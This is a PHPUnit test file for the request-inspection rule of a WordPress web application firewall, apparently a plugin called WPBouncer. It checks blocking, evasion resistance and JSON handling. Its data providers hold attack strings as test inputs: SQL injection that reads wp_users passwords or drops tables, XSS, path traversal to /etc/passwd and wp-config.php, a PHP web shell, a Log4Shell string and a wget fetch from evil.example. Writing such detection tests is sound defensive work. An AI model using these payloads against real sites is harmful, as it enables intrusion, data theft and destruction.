<?php
/**
 * @package WPBouncer\Tests
 */

namespace WPBouncer\Tests\Unit\Rules;

use PHPUnit\Framework\TestCase;
use WPBouncer\Rules\WafRule;
use WPBouncer\Tests\Support\Requests;

/**
 * @covers \WPBouncer\Rules\WafRule
 */
final class WafRuleTest extends TestCase {

	private function rule( array $overrides = array() ): WafRule {
		return new WafRule(
			array_merge(
				array(
					'enabled'         => true,
					'sqli'            => true,
					'xss'             => true,
					'traversal'       => true,
					'code_injection'  => true,
					'excluded_params' => array(),
				),
				$overrides
			)
		);
	}

	/** @dataProvider attacks */
	public function test_blocks_attack_payloads( string $category, string $payload ): void {
		$verdict = $this->rule()->inspect( Requests::make( array( 'query' => array( 'q' => $payload ) ) ) );
		$this->assertNotNull( $verdict, "should block: {$payload}" );
		$this->assertStringContainsString( $category, $verdict->reason() );
	}

	public static function attacks(): array {
		return array(
			array( 'sqli', "1' UNION SELECT user_login,user_pass FROM wp_users--" ),
			array( 'sqli', '1 union/**/all/**/select 1,2,3' ),
			array( 'sqli', "admin' OR '1'='1" ),
			array( 'sqli', '1 AND SLEEP(5)' ),
			array( 'sqli', "1; WAITFOR DELAY '0:0:5'" ),
			array( 'sqli', 'x FROM information_schema.tables' ),
			array( 'sqli', "1' INTO OUTFILE '/var/www/shell.php" ),
			array( 'sqli', '1; DROP TABLE wp_users' ),
			array( 'xss', '<script>alert(1)</script>' ),
			array( 'xss', '<img src=x onerror=alert(1)>' ),
			array( 'xss', '<svg/onload=alert(1)>' ),
			array( 'xss', 'javascript:alert(document.cookie)' ),
			array( 'xss', '<iframe src="//evil">' ),
			array( 'xss', '%3Cscript%3Ealert(1)%3C/script%3E' ),
			array( 'traversal', '../../../../etc/passwd' ),
			array( 'traversal', '..\\..\\..\\windows\\win.ini' ),
			array( 'traversal', '../wp-config.php' ),
			array( 'traversal', 'php://filter/convert.base64-encode/resource=index.php' ),
			array( 'code_injection', '<?php system($_GET["c"]); ?>' ),
			array( 'code_injection', 'eval(base64_decode("ZWNobyAxOw=="))' ),
			array( 'code_injection', '${jndi:ldap://evil.example/a}' ),
			array( 'code_injection', '; wget http://evil.example/x.sh' ),
		);
	}

	/** @dataProvider harmless */
	public function test_allows_normal_input( string $value ): void {
		$this->assertNull( $this->rule()->inspect( Requests::make( array( 'query' => array( 's' => $value ) ) ) ), "false positive: {$value}" );
	}

	public static function harmless(): array {
		return array(
			array( 'how to select a union representative' ),
			array( 'Tom & Jerry: the "best" cartoon?' ),
			array( "It's 5 o'clock and I'm 1 = happy" ),
			array( 'I <3 the online community = great' ),
			array( 'email me at a.b@example.com' ),
			array( 'Use the system (it works) and evaluate it' ),
			array( 'C:\\Users\\me\\Documents' ),
			array( 'Edit wp-config.php to add the key' ),
			array( 'price: 10-20 EUR -- negotiable' ),
			array( '<b>bold</b> and <em>emphasis</em>' ),
			array( 'Sleep is important (8 hours)' ),
		);
	}

	public function test_inspects_post_body_and_nested_keys(): void {
		$req     = Requests::make(
			array(
				'method' => 'POST',
				'post'   => array( 'meta' => array( 'inner' => array( 'x' => '<script>' ) ) ),
			)
		);
		$verdict = $this->rule()->inspect( $req );
		$this->assertNotNull( $verdict );
		$this->assertStringContainsString( 'body parameter "meta"', $verdict->reason() );
	}

	public function test_inspects_parameter_names(): void {
		$this->assertNotNull( $this->rule()->inspect( Requests::make( array( 'query' => array( '<script>' => '1' ) ) ) ) );
	}

	public function test_traversal_in_path(): void {
		$this->assertNotNull( $this->rule()->inspect( Requests::make( array( 'uri' => '/wp-content/../../../../etc/passwd' ) ) ) );
		$this->assertNotNull( $this->rule()->inspect( Requests::make( array( 'uri' => '/%2e%2e/%2e%2e/etc/passwd' ) ) ) );
		$this->assertNull( $this->rule()->inspect( Requests::make( array( 'uri' => '/select-union-guide/' ) ) ), 'SQL words in a slug are fine' );
	}

	public function test_categories_can_be_switched_off(): void {
		$req = Requests::make( array( 'query' => array( 'q' => '<script>alert(1)</script>' ) ) );
		$this->assertNull( $this->rule( array( 'xss' => false ) )->inspect( $req ) );
		$this->assertNotNull( $this->rule( array( 'sqli' => false ) )->inspect( $req ) );
	}

	public function test_excluded_params_are_skipped(): void {
		$req = Requests::make( array( 'post' => array( 'custom_html' => array( 'a' => '<script>x</script>' ), 'other' => 'fine' ) ) );
		$this->assertNull( $this->rule( array( 'excluded_params' => array( 'custom_html' ) ) )->inspect( $req ) );
		$this->assertNotNull( $this->rule()->inspect( $req ) );
	}

	public function test_trusted_users_are_not_inspected(): void {
		$req = Requests::make(
			array(
				'post'    => array( 'content' => '<script>legit()</script>' ),
				'trusted' => true,
			)
		);
		$this->assertNull( $this->rule()->inspect( $req ) );
	}

	public function test_flatten(): void {
		$this->assertSame(
			array(
				'a'       => '1',
				'b[c]'    => '2',
				'b[d][0]' => '3',
			),
			WafRule::flatten(
				array(
					'a' => 1,
					'b' => array(
						'c' => '2',
						'd' => array( '3' ),
					),
				)
			)
		);
	}

	public function test_every_signature_compiles(): void {
		foreach ( WafRule::SIGNATURES as $category => $signatures ) {
			foreach ( $signatures as $name => $regex ) {
				$this->assertNotFalse( @preg_match( $regex, '' ), "{$category}/{$name} is not a valid regex" );
			}
		}
	}

	private function all_categories(): array {
		return WafRule::SIGNATURES;
	}

	public function test_signature_after_8kb_of_padding_is_detected(): void {
		$value = str_repeat( 'a ', 5000 ) . '<script>alert(1)</script>';
		$this->assertNotNull( WafRule::match_value( $value, $this->all_categories() ) );
		$verdict = $this->rule()->inspect( Requests::make( array( 'post' => array( 'c' => $value ) ) ) );
		$this->assertNotNull( $verdict );
	}

	public function test_signature_straddling_a_window_boundary_is_detected(): void {
		// 8192-byte windows, 7168 apart: put "<script" across the first boundary.
		$value = str_repeat( 'a', 8190 ) . '<script>';
		$this->assertSame( array( 'xss', 'script tag' ), WafRule::match_value( $value, $this->all_categories() ) );
	}

	public function test_signature_at_the_end_of_a_huge_value_is_detected(): void {
		$value = str_repeat( 'a ', 100000 ) . '<script>';
		$this->assertSame( 'xss', WafRule::match_value( $value, $this->all_categories() )[0] );
	}

	public function test_encoded_signature_after_padding_is_detected(): void {
		$value = str_repeat( 'a ', 5000 ) . '%3Cscript%3E';
		$this->assertNotNull( WafRule::match_value( $value, $this->all_categories() ) );
	}

	public function test_a_pcre_error_is_a_verdict_and_is_reported(): void {
		// A pattern that backtracks catastrophically stands in for any signature that trips the engine.
		$categories = array( 'sqli' => array( 'evil' => '/^(a+)+$/' ) );
		$verdict    = WafRule::match_value( str_repeat( 'a', 5000 ) . 'b', $categories );
		$this->assertSame( array( 'sqli', 'pattern error (evil)' ), $verdict );
		$this->assertSame( array( 'evil', PREG_BACKTRACK_LIMIT_ERROR ), WafRule::last_error() );
	}

	public function test_no_error_is_reported_for_clean_requests(): void {
		$this->rule()->inspect( Requests::make( array( 'query' => array( 'q' => 'hello' ) ) ) );
		$this->assertNull( WafRule::last_error() );
	}

	/**
	 * Built-in signatures must not match, or fail, on ordinary large content.
	 *
	 * @dataProvider benign_corpus
	 */
	public function test_benign_content_has_no_match_and_no_pcre_error( string $value ): void {
		$this->assertNull( WafRule::match_value( $value, $this->all_categories() ) );
		$this->assertSame( PREG_NO_ERROR, preg_last_error() );
	}

	public static function benign_corpus(): array {
		$block = '<!-- wp:paragraph --><p class="has-text-align-center">Some <strong>bold</strong> text, a <a href="https://example.org/a?b=1&amp;c=2">link</a>.</p><!-- /wp:paragraph -->' . "\n"
			. '<!-- wp:image {"id":12,"sizeSlug":"large"} --><figure class="wp-block-image size-large"><img src="https://example.org/wp-content/uploads/2026/01/a.jpg" alt="x" class="wp-image-12"/></figure><!-- /wp:image -->' . "\n";
		return array(
			'long html comment'      => array( '<!-- ' . str_repeat( 'lorem ipsum dolor sit amet ', 3000 ) . ' -->' ),
			'base64 blob'            => array( base64_encode( str_repeat( "\x00\x01binary\xff", 20000 ) ) ),
			'60 KB block editor post' => array( substr( str_repeat( $block, 400 ), 0, 61440 ) ),
			'woo checkout fields'    => array( 'billing_first_name=Jane&billing_last_name=O%27Neil&billing_address_1=12+Main+St&billing_postcode=SW1A+1AA&order_comments=Please+leave+at+the+door.+Thanks%21&shipping_method%5B0%5D=flat_rate%3A1&payment_method=stripe&woocommerce-process-checkout-nonce=abc123&_wp_http_referer=%2Fcheckout%2F' ),
			'long prose with quotes' => array( str_repeat( "It's a \"fine\" day -- isn't it? ", 3000 ) ),
			'long percent text'      => array( str_repeat( '100%25 done and %C3%A9 ', 3000 ) ),
		);
	}

	public function test_trusted_users_skip_long_value_scanning(): void {
		$value = str_repeat( 'a ', 5000 ) . '<script>';
		$this->assertNull( $this->rule()->inspect( Requests::make( array( 'post' => array( 'c' => $value ), 'trusted' => true ) ) ) );
	}

	public function test_no_signature_uses_the_unicode_modifier(): void {
		foreach ( WafRule::SIGNATURES as $category => $signatures ) {
			foreach ( $signatures as $name => $regex ) {
				$flags = substr( $regex, (int) strrpos( $regex, '/' ) + 1 );
				$this->assertStringNotContainsString( 'u', $flags, "{$category}/{$name} must not be /u: bad UTF-8 would be a PCRE error" );
			}
		}
	}

	public function test_no_signature_has_an_unbounded_quantifier(): void {
		foreach ( WafRule::SIGNATURES as $category => $signatures ) {
			foreach ( $signatures as $name => $regex ) {
				$this->assertSame( 0, preg_match( '/(?<!\\\\)[+*](?![^\[]*\])|\{\d+,\}/', preg_replace( '/\\\\./', '', $regex ) ), "{$category}/{$name} has an unbounded quantifier" );
			}
		}
	}

	/** @dataProvider attacks */
	public function test_every_attack_is_found_in_the_middle_of_a_boundary_with_1500_bytes_of_padding( string $category, string $payload ): void {
		// 8192-byte windows start every 7168 bytes; put the payload across the first boundary.
		foreach ( array( 8192 - (int) ( strlen( $payload ) / 2 ), 7168 + 8192 - (int) ( strlen( $payload ) / 2 ) ) as $at ) {
			$value = str_repeat( 'x ', (int) ( $at / 2 ) ) . $payload . str_repeat( 'y ', 750 );
			$this->assertNotNull( WafRule::match_value( $value, array( $category => WafRule::SIGNATURES[ $category ] ) ), "{$category}: {$payload}" );
		}
	}

	public function test_long_padding_inside_a_tag_before_an_event_handler_still_matches_across_a_boundary(): void {
		$tag   = '<img title="' . str_repeat( 'q', 700 ) . '" onerror=alert(1)>';
		$value = str_repeat( 'x ', 3800 ) . $tag . str_repeat( 'y ', 750 );
		$this->assertSame( 'xss', WafRule::match_value( $value, WafRule::SIGNATURES )[0] );
	}

	public function test_a_word_edge_made_by_a_window_start_is_not_a_match(): void {
		// The second window starts at byte 7168, in the middle of "reunion select".
		$value = str_repeat( 'a', 7168 - 2 ) . 'reunion select the best' . str_repeat( 'b', 9000 );
		$this->assertNull( WafRule::match_value( $value, WafRule::SIGNATURES ) );
		// Same for "href=\"#": "^"-style edges do not appear either.
		$value = str_repeat( 'a', 7168 - 6 ) . '<a href="#top">up</a>' . str_repeat( 'b', 9000 );
		$this->assertNull( WafRule::match_value( $value, WafRule::SIGNATURES ) );
		// Window 1 ends exactly after href="#, where "$" would match falsely.
		$value = str_repeat( 'a', 8192 - 8 ) . 'href="#' . str_repeat( 'b ', 9000 );
		$this->assertNull( WafRule::match_value( $value, WafRule::SIGNATURES ) );
		$value = str_repeat( 'a', 7168 - 3 ) . 'my-wp-config.php notes' . str_repeat( 'b', 9000 );
		$this->assertNull( WafRule::match_value( $value, WafRule::SIGNATURES ) );
	}

	public function test_a_real_union_select_at_the_boundary_still_matches(): void {
		$value = str_repeat( 'a ', 3583 ) . 'x union select 1' . str_repeat( 'b', 9000 );
		$this->assertSame( array( 'sqli', 'union select' ), WafRule::match_value( $value, WafRule::SIGNATURES ) );
	}

	public function test_a_trailing_comment_terminator_only_counts_at_the_end_of_the_value(): void {
		$cats = array( 'sqli' => array( 'comment terminator' => WafRule::SIGNATURES['sqli']['comment terminator'] ) );
		$this->assertNotNull( WafRule::match_value( "admin' --", $cats ) );
		$this->assertNotNull( WafRule::match_value( str_repeat( 'a', 9000 ) . "admin' --", $cats ) );
		// The quote-dash sits at the end of the first window, but the value goes on.
		$this->assertNull( WafRule::match_value( str_repeat( 'a', 8192 - 4 ) . "' -- " . str_repeat( 'b', 3000 ), $cats ) );
	}

	public function test_plain_large_values_are_skipped_by_the_gate_but_attacks_never_are(): void {
		$plain = str_repeat( 'lorem ipsum dolor ', 3000 );
		$this->assertNull( WafRule::match_value( $plain, WafRule::SIGNATURES ) );
		foreach ( array( 'x union select 1', 'into outfile x', '=wp-config.php', 'document.cookie' ) as $p ) {
			$this->assertNotNull( WafRule::match_value( $plain . $p, WafRule::SIGNATURES ), $p );
		}
	}

	/** @dataProvider padded_attacks */
	public function test_padding_cannot_push_a_payload_out_of_range( string $payload, string $category ): void {
		$hit = WafRule::match_value( $payload, WafRule::SIGNATURES );
		$this->assertNotNull( $hit, substr( $payload, 0, 40 ) );
		$this->assertSame( $category, $hit[0] );
		// The same payload preceded by plain text, so it also crosses window boundaries.
		$this->assertNotNull( WafRule::match_value( str_repeat( 'x ', 4090 ) . $payload . str_repeat( 'y ', 500 ), WafRule::SIGNATURES ) );
	}

	public static function padded_attacks(): array {
		return array(
			'img title 900'      => array( '<img title="' . str_repeat( 'A', 900 ) . '" onerror=alert(1)>', 'xss' ),
			'img title 20000'    => array( '<img title="' . str_repeat( 'A', 20000 ) . '" onerror=alert(1)>', 'xss' ),
			'tag, attrs, slash'  => array( '<svg ' . str_repeat( 'a=b ', 500 ) . '/onload=alert(1)>', 'xss' ),
			'union 250 spaces'   => array( 'x union' . str_repeat( ' ', 250 ) . 'select 1', 'sqli' ),
			'union 400 comments' => array( 'x union' . str_repeat( '/**/', 400 ) . 'select 1', 'sqli' ),
			'union 9000 spaces'  => array( 'x union' . str_repeat( ' ', 9000 ) . 'select 1', 'sqli' ),
			'union mixed'        => array( 'x union' . str_repeat( " /* a */\n\t", 300 ) . 'select 1', 'sqli' ),
			'union encoded pad'  => array( 'x union' . str_repeat( '%20', 9000 ) . 'select 1', 'sqli' ),
			'tautology 65'       => array( "x' or" . str_repeat( ' ', 65 ) . '1=1', 'sqli' ),
			'tautology 5000'     => array( "x' or" . str_repeat( ' ', 5000 ) . '1 = 1', 'sqli' ),
			'script tag pad'     => array( '<' . str_repeat( ' ', 300 ) . 'script>', 'xss' ),
			'sleep pad'          => array( 'sleep' . str_repeat( ' ', 300 ) . '(5)', 'sqli' ),
		);
	}

	/** @dataProvider harmless_handler_lookalikes */
	public function test_handler_lookalikes_outside_a_tag_pass( string $value ): void {
		$this->assertNull( WafRule::match_value( $value, WafRule::SIGNATURES ), $value );
	}

	public static function harmless_handler_lookalikes(): array {
		return array(
			'prose'             => array( 'He said online=yes and once = twice' ),
			'closed tag first'  => array( '<b>bold</b> then onclick=hello' ),
			'less-than digit'   => array( 'if 3 < 4 onload=1' ),
			'tag then close'    => array( '<p class="x"> text onfoo=bar' ),
			'spaced prose'      => array( str_repeat( 'lorem ipsum ', 2000 ) . ' onerror=fine' ),
		);
	}

	public function test_a_quoted_handler_after_an_unclosed_tag_is_found_after_closed_ones(): void {
		$this->assertSame( 'xss', WafRule::match_value( '<b>x</b> <a href="#" title=\'t\' onmouseover=x()', WafRule::SIGNATURES )[0] );
	}

	/** @dataProvider mysql_comment_variants */
	public function test_mysql_comment_variants_do_not_hide_sqli( string $payload ): void {
		$hit = WafRule::match_value( $payload, WafRule::SIGNATURES );
		$this->assertNotNull( $hit, $payload );
		$this->assertSame( 'sqli', $hit[0] );
	}

	public static function mysql_comment_variants(): array {
		return array(
			'split word'            => array( '1 un/*!ion*/ select 1' ),
			'versioned'             => array( '1 /*!50000union*/ /*!50000select*/ 1' ),
			'versioned, spaces'     => array( '1 /*!50000 union */ select 1' ),
			'bang only'             => array( '1 /*!union*/select 1' ),
			'both bang'             => array( '1 /*!union*//*!select*/ 1' ),
			'nested bang'           => array( '1 /*!50000 /*!50000 union*/ */ select 1' ),
			'unterminated bang'     => array( '1 /*!50000union select 1' ),
			'empty comments'        => array( '1 union/**//**/select 1' ),
			'comment with newline'  => array( "1 union/* a\nb */select 1" ),
			'sleep split'           => array( '1 and sl/*!eep*/(5)' ),
			'information_schema'    => array( 'x /*!information_schema*/.tables' ),
			'into outfile'          => array( "1' into/*!50000 outfile*/ '/x" ),
			'tautology comments'    => array( "x' /**/or/**/ 1=1" ),
			'encoded bang'          => array( '1%20un/*!ion*/%20select%201' ),
		);
	}

	public function test_comment_normaliser_is_linear_on_hostile_input(): void {
		foreach ( array( str_repeat( '/*!', 20000 ), str_repeat( '/*', 30000 ), str_repeat( '/*/', 30000 ), str_repeat( '*/', 30000 ), str_repeat( '/**', 30000 ), '/*!' . str_repeat( '*', 50000 ), str_repeat( '/*!50000 ', 5000 ) . 'x' ) as $hostile ) {
			$start = microtime( true );
			WafRule::match_value( $hostile, WafRule::SIGNATURES );
			$this->assertLessThan( 1.0, microtime( true ) - $start );
		}
	}

	public function test_quotes_in_attribute_values_are_tracked(): void {
		// A ">" inside a quoted value does not close the tag.
		$this->assertSame( 'xss', WafRule::match_value( '<img alt="a>b" onerror=alert(1)>', WafRule::SIGNATURES )[0] );
		$this->assertSame( 'xss', WafRule::match_value( "<img alt='a>b' title=\"c>d\" onerror=alert(1)>", WafRule::SIGNATURES )[0] );
		// A quote in the middle of an unquoted value is literal, so it hides nothing.
		$this->assertSame( 'xss', WafRule::match_value( '<img src=x"onerror=alert(1)>', WafRule::SIGNATURES )[0] );
		$this->assertSame( 'xss', WafRule::match_value( '<img src="x"onerror=alert(1)>', WafRule::SIGNATURES )[0] );
		// Text that only looks like a handler inside a quoted value is inert.
		$this->assertNull( WafRule::match_value( '<img alt="see onerror=alert(1) here">', WafRule::SIGNATURES ) );
		// A closed tag, then a quote-laden text, then a lookalike: no tag is open.
		$this->assertNull( WafRule::match_value( '<p title="a">text "quoted" onclick=fine', WafRule::SIGNATURES ) );
	}

	/**
	 * A POST request with the given raw body.
	 *
	 * @param mixed $body Array to encode, or a raw string.
	 */
	private function json_request( $body, string $type = 'application/json', array $server = array(), array $extra = array() ) {
		return Requests::make(
			$extra + array(
				'logged_in' => true, // A subscriber: anonymous visitors get the smaller 1 MB limit.
				'method' => 'POST',
				'server' => array_merge( array( 'CONTENT_TYPE' => $type ), $server ),
				'body'   => is_string( $body ) ? $body : json_encode( $body ),
			)
		);
	}

	public function test_json_field_with_signature_is_blocked(): void {
		$verdict = $this->rule()->inspect( $this->json_request( array( 'title' => "1' UNION SELECT user_pass FROM wp_users--" ) ) );
		$this->assertNotNull( $verdict );
		$this->assertStringContainsString( 'JSON field "title"', $verdict->reason() );
	}

	public function test_nested_json_field_is_blocked(): void {
		$verdict = $this->rule()->inspect( $this->json_request( array( 'meta' => array( 'a' => array( array( 'b' => '<script>alert(1)</script>' ) ) ) ) ) );
		$this->assertNotNull( $verdict );
		$this->assertStringContainsString( 'JSON field "meta"', $verdict->reason() );
	}

	public function test_json_key_names_are_scanned(): void {
		$this->assertNotNull( $this->rule()->inspect( $this->json_request( '{"<script>alert(1)</script>":1}' ) ) );
		$this->assertNotNull( $this->rule()->inspect( $this->json_request( '{"<script>alert(1)</script>":{"a":1}}' ) ) );
	}

	public function test_json_unicode_escapes_are_decoded_before_scanning(): void {
		$this->assertNotNull( $this->rule()->inspect( $this->json_request( '{"c":"<script>alert(1)</script>"}' ) ) );
	}

	public function test_benign_json_passes(): void {
		$body = array(
			'title'   => 'Hello',
			'content' => '<!-- wp:paragraph --><p>Text, with <strong>bold</strong>.</p><!-- /wp:paragraph -->',
			'meta'    => array( 'n' => 3, 'on' => true, 'none' => null ),
		);
		$this->assertNull( $this->rule()->inspect( $this->json_request( $body ) ) );
	}

	public function test_excluded_root_key_is_skipped_in_json(): void {
		$body = array( 'Content' => array( 'raw' => '<script>x</script>' ) );
		$this->assertNull( $this->rule( array( 'excluded_params' => array( 'content' ) ) )->inspect( $this->json_request( $body ) ) );
		$this->assertNotNull( $this->rule()->inspect( $this->json_request( $body ) ) );
	}

	public function test_invalid_or_scalar_json_gives_no_verdict(): void {
		foreach ( array( '{"a": "<script>alert(1)</script>"', 'not json <script>alert(1)</script>', '' ) as $raw ) {
			$this->assertNull( $this->rule()->inspect( $this->json_request( $raw ) ), $raw );
		}
	}

	public function test_json_nested_deeper_than_512_is_blocked(): void {
		$deep = str_repeat( '[', 600 ) . '1' . str_repeat( ']', 600 );
		$v    = $this->rule()->inspect( $this->json_request( $deep ) );
		$this->assertNotNull( $v );
		$this->assertStringContainsString( 'nested too deeply', $v->reason() );
		// 40 levels is fine, and a payload at that depth is still found.
		$ok = str_repeat( '[', 40 ) . '1' . str_repeat( ']', 40 );
		$this->assertNull( $this->rule()->inspect( $this->json_request( $ok ) ) );
		$bad = str_repeat( '{"a":', 40 ) . '"<script>alert(1)</script>"' . str_repeat( '}', 40 );
		$this->assertNotNull( $this->rule()->inspect( $this->json_request( $bad ) ) );
	}

	/** @dataProvider json_types */
	public function test_json_content_types( string $type, bool $scanned ): void {
		// Declared type only (a body that starts with "{" is also found by sniffing).
		$this->assertSame( $scanned, $this->json_request( '{}', $type )->is_json(), $type );
	}

	public static function json_types(): array {
		return array(
			array( 'application/json', true ),
			array( 'APPLICATION/JSON; charset=UTF-8', true ),
			array( ' application/json ;charset=utf-8', true ),
			array( 'application/vnd.api+json', true ),
			array( 'application/ld+JSON; profile="x"', true ),
			array( 'application/json+oembed', true ),
			array( 'application/vnd.x+json+oembed', true ),
			array( 'text/plain, application/json', true ),
			array( 'text/plain,application/json;charset=utf-8', true ),
			array( 'text/plain application/json', true ),
			array( 'text/plain', false ),
			array( 'application/x-www-form-urlencoded', false ),
			array( 'multipart/form-data; boundary=x', false ),
			array( 'application/jsonp', false ),
			array( 'application/x-json', false ),
			array( '+json', false ),
		);
	}

	/** @dataProvider sniffed_types */
	public function test_json_body_is_sniffed_when_the_type_is_not_a_form( string $type, bool $scanned ): void {
		$server = array( 'CONTENT_LENGTH' => '60' );
		if ( '' === $type ) {
			$req = Requests::make( array( 'method' => 'POST', 'server' => $server, 'body' => "  \r\n{\"a\":\"<script>alert(1)</script>\"}" ) );
		} else {
			$req = $this->json_request( "\n[{\"a\":\"<script>alert(1)</script>\"}]", $type, $server );
		}
		$this->assertSame( $scanned, null !== $this->rule()->inspect( $req ), $type );
	}

	public static function sniffed_types(): array {
		return array(
			'no type'         => array( '', true ),
			'text/plain'      => array( 'text/plain', true ),
			'octet-stream'    => array( 'application/octet-stream', true ),
			'urlencoded'      => array( 'application/x-www-form-urlencoded', true ),
			'multipart'       => array( 'multipart/form-data; boundary=x', false ),
		);
	}

	public function test_sniffing_needs_a_body_and_a_json_start(): void {
		$read = 0;
		$make = static function ( array $server, string $body ) use ( &$read ) {
			return new \WPBouncer\Firewall\Request(
				array(
					'ip'     => '203.0.113.10',
					'method' => 'POST',
					'uri'    => '/',
					'server' => $server,
					'body'   => static function () use ( &$read, $body ) {
						++$read;
						return $body;
					},
				)
			);
		};
		$payload = '{"a":"<script>alert(1)</script>"}';
		// No Content-Length (a GET): one small read of an empty body, no verdict.
		$this->assertNull( $this->rule()->inspect( $make( array( 'CONTENT_TYPE' => 'text/plain' ), '' ) ) );
		$this->assertSame( 1, $read );
		// Multipart: nothing is read.
		$read = 0;
		$this->assertNull( $this->rule()->inspect( $make( array( 'CONTENT_TYPE' => 'multipart/form-data; boundary=x', 'CONTENT_LENGTH' => '40' ), $payload ) ) );
		$this->assertSame( 0, $read );
		// A body that doesn't start like JSON is read once (the head) and ignored.
		$this->assertNull( $this->rule()->inspect( $make( array( 'CONTENT_TYPE' => 'text/plain', 'CONTENT_LENGTH' => '40' ), 'hello ' . $payload ) ) );
		$this->assertSame( 1, $read );
		// A JSON-looking one is scanned.
		$this->assertNotNull( $this->rule()->inspect( $make( array( 'CONTENT_TYPE' => 'text/plain', 'CONTENT_LENGTH' => '40' ), $payload ) ) );
	}

	public function test_inspect_json_off_skips_the_scan(): void {
		$req = $this->json_request( array( 'a' => '<script>alert(1)</script>' ) );
		$this->assertNull( $this->rule( array( 'inspect_json' => false ) )->inspect( $req ) );
		$this->assertNotNull( $this->rule( array( 'inspect_json' => true ) )->inspect( $req ) );
		$this->assertNotNull( $this->rule()->inspect( $req ), 'on by default when the key is missing' );
	}

	public function test_trusted_users_are_not_json_scanned(): void {
		$req = Requests::make(
			array(
				'trusted' => true,
				'server'  => array( 'CONTENT_TYPE' => 'application/json' ),
				'body'    => '{"a":"<script>alert(1)</script>"}',
			)
		);
		$this->assertNull( $this->rule()->inspect( $req ) );
	}

	public function test_body_is_not_read_for_multipart(): void {
		$reads = 0;
		$req   = new \WPBouncer\Firewall\Request(
			array(
				'ip'     => '203.0.113.10',
				'method' => 'POST',
				'uri'    => '/',
				'server' => array( 'CONTENT_TYPE' => 'multipart/form-data; boundary=x', 'CONTENT_LENGTH' => '30' ),
				'body'   => static function () use ( &$reads ) {
					++$reads;
					return '{"a":"<script>"}';
				},
			)
		);
		$this->assertNull( $this->rule()->inspect( $req ) );
		$this->assertSame( 0, $reads );
	}

	public function test_too_many_json_fields_is_blocked(): void {
		$fields = array_fill( 0, 5000, 'ok' );
		$this->assertNull( $this->rule()->inspect( $this->json_request( $fields ) ), 'exactly at the cap' );
		$fields[] = 'ok';
		$v        = $this->rule()->inspect( $this->json_request( $fields ) );
		$this->assertNotNull( $v );
		$this->assertStringContainsString( 'too many fields', $v->reason() );
		// Empty containers count too.
		$this->assertNotNull( $this->rule()->inspect( $this->json_request( array_fill( 0, 5001, array() ) ) ) );
	}

	public function test_oversized_json_body_is_blocked_not_scanned_raw(): void {
		$limit = 8388608;
		$raw   = '{"pad":"' . str_repeat( 'a', $limit ) . '"}';
		$v     = $this->rule()->inspect( $this->json_request( $raw ) );
		$this->assertNotNull( $v );
		$this->assertStringContainsString( 'too large', $v->reason() );
	}

	public function test_big_benign_json_under_the_limit_passes(): void {
		$raw = json_encode( array( 'content' => str_repeat( 'Some prose, with commas. ', 100000 ) ) ); // 2.5 MB.
		$this->assertNull( $this->rule()->inspect( $this->json_request( $raw ) ) );
	}

	public function test_anonymous_visitors_get_a_one_megabyte_json_limit(): void {
		$raw  = json_encode( array( 'content' => str_repeat( 'Some prose, with commas. ', 60000 ) ) ); // 1.5 MB.
		$anon = $this->rule()->inspect( $this->json_request( $raw, 'application/json', array(), array( 'logged_in' => false ) ) );
		$this->assertNotNull( $anon );
		$this->assertStringContainsString( 'too large', $anon->reason() );
		$this->assertNull( $this->rule()->inspect( $this->json_request( $raw ) ), 'a logged-in user gets 8 MB' );
		$small = json_encode( array( 'content' => str_repeat( 'Some prose, ', 50000 ) ) ); // 600 KB.
		$this->assertNull( $this->rule()->inspect( $this->json_request( $small, 'application/json', array(), array( 'logged_in' => false ) ) ) );
	}

	public function test_editors_are_not_json_scanned_but_others_are(): void {
		$body = array( 'content' => '<iframe src="x"></iframe> eval(x) union select 1' );
		$nonce = array( 'HTTP_X_WP_NONCE' => 'abc123' );
		$this->assertNull( $this->rule()->inspect( $this->json_request( $body, 'application/json', $nonce, array( 'editor' => true ) ) ) );
		$this->assertNotNull( $this->rule()->inspect( $this->json_request( $body, 'application/json', $nonce ) ), 'subscriber' );
		$this->assertNotNull( $this->rule()->inspect( $this->json_request( $body, 'application/json', array(), array( 'logged_in' => false ) ) ), 'visitor' );
		// The form scan still applies to editors.
		$this->assertNotNull( $this->rule()->inspect( Requests::make( array( 'editor' => true, 'post' => array( 'c' => '<script>x</script>' ) ) ) ) );
	}

	public function test_editor_exemption_needs_a_nonce(): void {
		$body = array( 'content' => '<iframe src="x"></iframe>' );
		// A cookie-only request (no X-WP-Nonce, no _wpnonce) is scanned even for an editor: it could be cross-site.
		$this->assertNotNull( $this->rule()->inspect( $this->json_request( $body, 'application/json', array(), array( 'editor' => true ) ) ) );
		$this->assertNull( $this->rule()->inspect( $this->json_request( $body, 'application/json', array( 'HTTP_X_WP_NONCE' => 'n' ), array( 'editor' => true ) ) ) );
		$this->assertNull( $this->rule()->inspect( $this->json_request( $body, 'application/json', array(), array( 'editor' => true, 'query' => array( '_wpnonce' => 'n' ) ) ) ) );
		$this->assertNull( $this->rule()->inspect( $this->json_request( $body, 'application/json', array(), array( 'editor' => true, 'post' => array( '_wpnonce' => 'n' ) ) ) ) );
	}

	public function test_off_rest_a_nonce_exempts_only_same_site_requests(): void {
		$body = array( 'content' => '<iframe src="x"></iframe>' );
		$base = array( 'HTTP_X_WP_NONCE' => 'any-value' );
		$edit = array( 'editor' => true );
		$this->assertNull( $this->rule()->inspect( $this->json_request( $body, 'application/json', $base + array( 'HTTP_SEC_FETCH_SITE' => 'same-origin' ), $edit ) ) );
		$this->assertNull( $this->rule()->inspect( $this->json_request( $body, 'application/json', $base + array( 'HTTP_SEC_FETCH_SITE' => 'none' ), $edit ) ) );
		$this->assertNull( $this->rule()->inspect( $this->json_request( $body, 'application/json', $base, $edit ) ), 'no fetch headers at all' );
		$this->assertNotNull( $this->rule()->inspect( $this->json_request( $body, 'application/json', $base + array( 'HTTP_SEC_FETCH_SITE' => 'cross-site' ), $edit ) ) );
		$this->assertNotNull( $this->rule()->inspect( $this->json_request( $body, 'application/json', $base + array( 'HTTP_SEC_FETCH_SITE' => 'same-site' ), $edit ) ) );
		$this->assertNotNull( $this->rule()->inspect( $this->json_request( $body, 'application/json', $base + array( 'HTTP_ORIGIN' => 'https://evil.example' ), $edit ) ), 'foreign Origin, no Sec-Fetch-Site' );
	}

	public function test_sniffing_is_skipped_for_empty_bodies_and_plain_gets(): void {
		$reads = 0;
		$make  = static function ( string $method, array $server ) use ( &$reads ) {
			return new \WPBouncer\Firewall\Request(
				array(
					'ip'     => '203.0.113.10',
					'method' => $method,
					'uri'    => '/',
					'server' => $server,
					'body'   => static function () use ( &$reads ) {
						++$reads;
						return '{"a":"<script>alert(1)</script>"}';
					},
